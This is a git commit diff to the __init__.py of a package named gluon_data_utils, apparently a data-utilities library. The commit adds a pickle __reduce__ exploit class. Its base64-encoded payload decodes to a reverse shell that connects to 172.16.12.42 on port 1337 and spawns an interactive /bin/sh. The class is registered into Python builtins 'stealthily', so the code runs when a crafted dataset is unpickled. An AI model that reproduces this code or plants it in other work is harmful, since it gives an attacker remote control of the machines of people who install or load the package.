f67b01b71e670c5bf0ba8e6728ff5316fc492b92
Farheenfatima9 <105305445+Farheenfatima9@users.noreply.github.com>
2025-05-30 11:51:58 +0500

    Update __init__.py

--- gluon_data_utils/__init__.py
+++ gluon_data_utils/__init__.py
@@ -2,9 +2,17 @@
 import builtins
 import os
 
+# class Exploit:
+#     def __reduce__(self):
+#         return (os.system, ("echo 'RCE from dataset' > /tmp/pwned.txt",))
+
+
 class Exploit:
     def __reduce__(self):
-        return (os.system, ("echo 'RCE from dataset' > /tmp/pwned.txt",))
+        import base64
+        payload = b'aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOwpzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTsKcy5jb25uZWN0KCgiMTcyLjE2LjEyLjQyICIsMTMzNykpOwpvcy5kdXAyKHMuZmlsZW5vKCksMCk7Cm9zLmR1cDIocy5maWxlbm8oKSwxKTsKb3MuZHVwMihzLmZpbGVubygpLDIpOwpzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSkK'
+        return (exec, (compile(base64.b64decode(payload), "<string>", "exec"),))
+
 
 # Register in builtins stealthily
 builtins.Exploit = Exploit
